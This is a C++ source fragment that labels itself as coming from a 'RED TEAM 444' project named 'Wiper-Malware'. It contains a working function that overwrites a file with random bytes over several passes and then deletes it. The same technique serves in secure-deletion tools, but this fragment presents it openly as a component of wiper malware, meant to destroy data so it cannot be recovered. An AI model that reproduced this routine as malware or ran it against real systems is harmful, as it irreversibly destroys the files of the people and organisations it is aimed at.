/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <random>  // Needed for random number generation

// Function to perform multiple overwrites with random bytes
void multipleRandomOverwrites(const std::string& filepath, int passes = 3) {
    try {
        std::ofstream file(filepath, std::ios::binary | std::ios::in);
        if (file.is_open()) {
            auto fileSize = std::filesystem::file_size(filepath);
            
            std::random_device rd;  // Random device for generating random bytes
            std::mt19937 gen(rd());  // Mersenne Twister for random number generation
            std::uniform_int_distribution<> dist(0, 255);  // Random byte range (0-255)
            
            for (int pass = 0; pass < passes; pass++) {
                file.seekp(0);  // Reset file position to the beginning for each pass
                for (uint64_t i = 0; i < fileSize; i++) {
                    char randomByte = static_cast<char>(dist(gen));  // Generate a random byte
                    file.put(randomByte);  // Overwrite with random byte
                }
                file.flush();  // Ensure data is written to disk
            }
            
            file.close();
        }
        std::filesystem::remove(filepath);  // Delete the file after overwriting
        std::cout << "File " << filepath << " overwritten and deleted successfully with multiple random passes.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error while overwriting file: " << e.what() << "\n";
    }
}
